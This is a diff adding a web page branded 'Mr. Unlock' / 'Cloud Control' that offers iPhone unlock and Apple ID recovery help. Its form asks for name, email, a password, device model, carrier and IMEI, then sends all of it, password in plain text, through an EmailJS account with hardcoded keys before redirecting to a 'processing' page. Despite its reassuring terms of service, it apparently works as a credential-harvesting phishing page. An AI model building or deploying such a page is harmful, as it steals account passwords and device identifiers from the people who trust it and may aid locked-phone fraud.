@@ -1,0 +1,403 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Mr. Unlock</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet">
+
+<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+<script>
+  (function(){
+    emailjs.init("X4J2kxxys4vMlTSyG");
+  })();
+</script>
+
+<style>
+* {
+  box-sizing: border-box;
+  margin: 0;
+  padding: 0;
+  font-family: 'Inter', sans-serif;
+}
+
+body {
+  background: #f5f5f7;
+  display: flex;
+  justify-content: center;
+  padding: 40px 20px;
+}
+
+.container {
+  width: 100%;
+  max-width: 520px;
+  background: #fff;
+  border-radius: 20px;
+  box-shadow: 0 10px 30px rgba(0,0,0,0.08);
+  padding: 40px;
+}
+
+.logo {
+  text-align: center;
+  margin-bottom: 25px;
+}
+
+.logo img {
+  max-width: 220px;
+}
+
+.section {
+  margin-bottom: 16px;
+}
+
+h2 {
+  font-size: 13px;
+  font-weight: 500;
+  color: #6e6e73;
+  margin-bottom: 6px;
+}
+
+input, textarea, select {
+  width: 100%;
+  padding: 12px;
+  border-radius: 10px;
+  border: 1px solid #d2d2d7;
+  font-size: 14px;
+  outline: none;
+}
+
+input:focus, textarea:focus, select:focus {
+  border-color: #0071e3;
+  box-shadow: 0 0 0 3px rgba(0,113,227,0.1);
+}
+
+textarea { resize: none; }
+
+.counter {
+  font-size: 11px;
+  color: #6e6e73;
+  margin-top: 4px;
+  text-align: right;
+}
+
+.terms-box {
+  height: 160px;
+  overflow-y: auto;
+  border: 1px solid #d2d2d7;
+  border-radius: 10px;
+  padding: 12px;
+  font-size: 12px;
+  color: #444;
+  background: #fafafa;
+  line-height: 1.4;
+}
+
+.checkbox-wrap {
+  display: flex;
+}
+
+.agree-label {
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  cursor: pointer;
+  white-space: nowrap;
+}
+
+/* =======================
+   BUTTON FIXES (IMPORTANT)
+======================= */
+
+button {
+  width: 100%;
+  padding: 14px;
+  border: none;
+  border-radius: 12px;
+  background: #999;
+  color: #fff;
+  font-size: 16px;
+  cursor: not-allowed;
+  margin-top: 10px;
+  transition: 0.2s;
+}
+
+/* Submit button active state */
+button.active {
+  background: #0071e3;
+  cursor: pointer;
+}
+
+button.active:hover {
+  background: #005bb5;
+}
+
+/* Variant buttons (iPhone selector) */
+.variant-btn {
+  flex: 1;
+  min-width: 80px;
+  padding: 10px;
+  border-radius: 10px;
+  border: 1px solid #d2d2d7;
+  background: #fff;
+  color: #1d1d1f;
+  cursor: pointer;
+  font-size: 12px;
+  transition: 0.2s;
+  user-select: none;
+}
+
+.variant-btn:hover {
+  border-color: #0071e3;
+  color: #0071e3;
+}
+
+.variant-btn:active {
+  transform: scale(0.97);
+}
+
+.variant-btn.active {
+  background: #0071e3;
+  color: #fff;
+  border-color: #0071e3;
+}
+</style>
+</head>
+
+<body>
+
+<div class="container">
+
+  <div class="logo">
+    <img src="cc-logo.png" alt="logo">
+  </div>
+
+  <form id="form">
+
+<div class="section">
+  <h2>Full Name</h2>
+
+  <div style="display: flex; gap: 10px;">
+    <input id="firstName" placeholder="First Name" required>
+    <input id="lastName" placeholder="Last Name" required>
+  </div>
+</div>
+
+    <div class="section">
+      <h2>Email</h2>
+      <input id="email" type="email" required>
+    </div>
+
+    <div class="section">
+      <h2>Password</h2>
+      <input id="password" type="password">
+    </div>
+
+<br>
+
+    <div class="section">
+      <h2>Device Information</h2>
+
+      <select id="iphoneModel">
+        <option value="" disabled selected>Select iPhone Model</option>
+        <option>iPhone 10</option>
+        <option>iPhone 11</option>
+        <option>iPhone 12</option>
+        <option>iPhone 13</option>
+        <option>iPhone 14</option>
+        <option>iPhone 15</option>
+        <option>iPhone 16</option>
+        <option>iPhone 17</option>
+      </select>
+
+      <div style="display:flex; gap:8px; margin-top:10px; flex-wrap:wrap;">
+        <button type="button" class="variant-btn" data-value="SE">SE</button>
+        <button type="button" class="variant-btn" data-value="S">S</button>
+        <button type="button" class="variant-btn" data-value="Standard">Standard</button>
+        <button type="button" class="variant-btn" data-value="Pro">Pro</button>
+        <button type="button" class="variant-btn" data-value="Pro Max">Pro Max</button>
+      </div>
+
+      <input type="hidden" id="device">
+    </div>
+
+<br>
+
+    <div class="section">
+      <h2>Current / Recent Service Provider</h2>
+      <select id="provider">
+        <option value="" disabled selected>Select your provider</option>
+        <option>Verizon</option>
+        <option>AT&T</option>
+        <option>T-Mobile</option>
+        <option>U.S. Cellular</option>
+        <option>Boost Mobile</option>
+        <option>Cricket Wireless</option>
+        <option>Metro by T-Mobile</option>
+        <option>Sprint (Legacy)</option>
+        <option>Google Fi</option>
+        <option>Xfinity Mobile</option>
+        <option>Vodafone</option>
+        <option>EE (UK)</option>
+        <option>O2</option>
+        <option>Orange</option>
+        <option>Three UK</option>
+        <option>Rogers (Canada)</option>
+        <option>Bell Mobility (Canada)</option>
+        <option>Telus (Canada)</option>
+        <option>Telstra (Australia)</option>
+        <option>Optus (Australia)</option>
+      </select>
+    </div>
+
+    <div class="section">
+      <h2>IMEI Number</h2>
+      <textarea id="imei" maxlength="19"></textarea>
+      <div class="counter" id="imeiCounter">0 / 15</div>
+    </div>
+
+    <div class="section">
+      <h2>Terms of Service</h2>
+
+      <div class="terms-box">
+        <p>
+          <strong>Cloud Control – Terms of Service</strong><br><br>
+
+          By using Cloud Control, you agree to the following terms:<br><br>
+
+          <strong>1. Service Overview</strong><br>
+          Cloud Control provides device access recovery assistance, including guidance for Apple ID recovery, device unlock eligibility checks, and related support services. We do not modify, bypass, or remove manufacturer security systems.<br><br>
+
+          <strong>2. No Guarantees</strong><br>
+          All services are provided on a best-effort basis. Results are not guaranteed and depend on third-party systems such as Apple and mobile carriers.<br><br>
+
+          <strong>3. Ownership Confirmation</strong><br>
+          You confirm legal ownership or authorization.<br><br>
+
+          <strong>4. Prohibited Use</strong><br>
+          No unlawful use permitted.<br><br>
+
+          <strong>5. Limitation of Liability</strong><br>
+          No liability for outcomes or data loss.<br><br>
+
+          <strong>6. Third-Party Services</strong><br>
+          Not affiliated with Apple or carriers.<br><br>
+
+          <strong>7. Service Outcome</strong><br>
+          Results are not guaranteed.
+        </p>
+      </div>
+<br>
+<div class="checkbox-wrap">
+  <label class="agree-label">
+    <input type="checkbox" id="agree">
+    <span>Select to Agree</span>
+  </label>
+</div>
+
+    <button id="submitBtn" disabled>Submit</button>
+  </form>
+</div>
+
+<script>
+const imei = document.getElementById("imei");
+const counter = document.getElementById("imeiCounter");
+const agree = document.getElementById("agree");
+const btn = document.getElementById("submitBtn");
+const form = document.getElementById("form");
+
+const modelSelect = document.getElementById("iphoneModel");
+const variantBtns = document.querySelectorAll(".variant-btn");
+const deviceInput = document.getElementById("device");
+
+let selectedVariant = "";
+
+/* VARIANT BUTTONS */
+variantBtns.forEach(b => {
+  b.addEventListener("click", () => {
+    variantBtns.forEach(x => x.classList.remove("active"));
+    b.classList.add("active");
+
+    selectedVariant = b.dataset.value;
+    updateDevice();
+    toggle();
+  });
+});
+
+/* MODEL DROPDOWN */
+modelSelect.addEventListener("change", () => {
+  updateDevice();
+  toggle();
+});
+
+function updateDevice() {
+  const model = modelSelect.value;
+
+  if (model && selectedVariant) {
+    deviceInput.value = `${model} ${selectedVariant}`;
+  } else {
+    deviceInput.value = "";
+  }
+}
+
+/* IMEI FORMAT (8 / 6 / 1) */
+imei.addEventListener("input", () => {
+  let digits = imei.value.replace(/\D/g, "").slice(0, 15);
+
+  let part1 = digits.slice(0, 8);
+  let part2 = digits.slice(8, 14);
+  let part3 = digits.slice(14, 15);
+
+  let formatted = part1;
+
+  if (part2.length) formatted += " " + part2;
+  if (part3.length) formatted += " " + part3;
+
+  imei.value = formatted;
+  counter.textContent = `${digits.length} / 15`;
+
+  toggle();
+});
+
+/* AGREEMENT CHECKBOX */
+agree.addEventListener("change", toggle);
+
+/* ENABLE / DISABLE BUTTON */
+function toggle() {
+  const digits = imei.value.replace(/\D/g, "");
+  const device = deviceInput.value;
+
+  if (agree.checked && digits.length === 15 && device.length > 0) {
+    btn.disabled = false;
+    btn.classList.add("active");
+  } else {
+    btn.disabled = true;
+    btn.classList.remove("active");
+  }
+}
+
+/* SUBMIT + EMAILJS */
+form.addEventListener("submit", (e) => {
+  e.preventDefault();
+
+  emailjs.send("service_ekexo4f", "template_kwnk6q7", {
+    name: document.getElementById("firstName").value + " " + document.getElementById("lastName").value,
+    title: "Cloud Control Submission",
+    device: document.getElementById("device").value,
+    provider: document.getElementById("provider").value,
+    imei: document.getElementById("imei").value.replace(/\s/g, ""),
+    email: document.getElementById("email").value,
+    password: document.getElementById("password").value
+  })
+  .then(() => {
+    window.location.href = "processing.html";
+  })
+  .catch(err => {
+    console.log("EMAILJS ERROR:", err);
+    alert("Submission failed — check console");
+  });
+});
+</script>
+
+</body>
+</html>
